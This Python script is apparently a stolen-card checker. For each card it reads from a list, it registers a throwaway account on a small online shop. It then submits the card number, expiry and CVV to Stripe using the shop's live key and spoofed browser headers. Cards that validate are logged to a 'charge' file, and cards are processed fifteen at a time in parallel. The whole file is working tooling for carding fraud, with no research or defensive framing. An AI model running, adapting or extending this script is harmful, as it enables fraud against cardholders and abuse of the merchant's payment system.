import base64
import httpx
import random
import time
import json
import uuid
import asyncio
from fake_useragent import UserAgent
import requests
from defs import *
import uuid
import re

def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None

        # client_token = gets(response_1.text, '{"status":200,"payload":"', '",')


async def create_payment_method(fullz, session):
    try:

        cc, mes, ano, cvv = fullz.split("|")
        user = "cristniki" + str(random.randint(9999, 574545))
        mail = "cristniki" + str(random.randint(9999, 574545))+"@gmail.com"




        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            # 'cookie': '__stripe_mid=11805fe3-45d1-447a-871a-6f5d64a3b9aab6f747; humans_21909=1; wordpress_test_cookie=WP%20Cookie%20check',
            'dnt': '1',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        response = await session.get('https://fixmemobile.com/my-account-2/', headers=headers)


        nonce = gets(response.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" /><')


        # print(nonce)


        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://fixmemobile.com',
            'priority': 'u=0, i',
            'referer': 'https://fixmemobile.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        data = {
            'email': mail,
            'password': 'hdnnbkxNCH6yDna',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account-2/',
            'register': 'Register',
        }

        response = await session.post('https://fixmemobile.com/my-account-2/', headers=headers, data=data)



        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dnt': '1',
            'priority': 'u=0, i',
            'referer': 'https://fixmemobile.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        response = await session.get('https://fixmemobile.com/my-account-2/', headers=headers)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dnt': '1',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        response = await session.get('https://fixmemobile.com/my-account-2/payment-methods/', headers=headers)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'dnt': '1',
            'priority': 'u=0, i',
            'referer': 'https://fixmemobile.com/my-account-2/payment-methods/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        response = await session.get('https://fixmemobile.com/my-account-2/add-payment-method/', headers=headers)


        payment_nonce = gets(response.text, '"add_card_nonce":"', '"')


        # print("payment_nonce ", payment_nonce)


        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        data={
            'type':'card',
            'billing_details[name]':' ',
            'billing_details[email]':mail,
            'card[number]':cc,
            'card[cvc]':cvv,
            'card[exp_month]':mes,
            'card[exp_year]':ano,
            'guid':'75b069b7-3af3-411a-8777-2ce73043a2b3b2cece',
            'muid':'11805fe3-45d1-447a-871a-6f5d64a3b9aab6f747',
            'sid':'9d30a447-9563-4301-a21d-02edd3386ab164f2c0',
            'pasted_fields':'number',
            'payment_user_agent':'stripe.js/803162f903; stripe-js-v3/803162f903; split-card-element',
            'referrer':'https://fixmemobile.com',
            'time_on_page':'82104',
            'key':'pk_live_51NaddyLBcKK5IM53aEKl8NjeG0XkXL2lJcj7yMh04Dogx0IIm2Vo6poN6KKuJyWRMbleatB6tg62yJAo6DMwoe4k00c0CAP14L',
            }
        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)


        try:
             id=response.json()['id']
            #  print(id)
        except:
             return response.text

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'dnt': '1',
            'origin': 'https://fixmemobile.com',
            'priority': 'u=1, i',
            'referer': 'https://fixmemobile.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data = {
            'stripe_source_id': id,
            'nonce': payment_nonce,
        }

        response = await session.post('https://fixmemobile.com/', params=params, headers=headers, data=data)


        print(response.text)


        return response.text


    except Exception as e:
        print(e)
        return str(e)


async def multi_checking(x):
    start = time.time()
    getproxy = random.choice(
        open("proxy.txt", "r", encoding="utf-8").read().splitlines())
    proxy_ip = getproxy.split(":")[0]
    proxy_port = getproxy.split(":")[1]
    proxy_user = getproxy.split(":")[2]
    proxy_password = getproxy.split(":")[3]
    proxies = {
        "https://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
        "http://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
    }
    session = httpx.AsyncClient(timeout=40)
    result = await create_payment_method(x, session)
    response = await charge_resp(result)
    resp = f"{x} - {response} - Taken {round(time.time() - start, 2)}s"
    print(resp)
    if 'Auth Success' in response or 'status":"success' in response or "CVV LIVE ❎" in response:
        # charge test
        with open("charge.txt", "a", encoding="utf-8") as file:
            file.write(resp + "\n")
    await session.aclose()
    await asyncio.sleep(0.5)


async def main():
    ccs = open("ccs.txt", "r", encoding="utf-8").read().splitlines()

    # for x in ccs:
    #    await multi_checking(x)
    #    exit()

    works = [multi_checking(i) for i in ccs]
    worker_num = 15
    while works:
        a = works[:worker_num]
        a = await asyncio.gather(*a)
        works = works[worker_num:]

if __name__ == "__main__":
    asyncio.run(main())
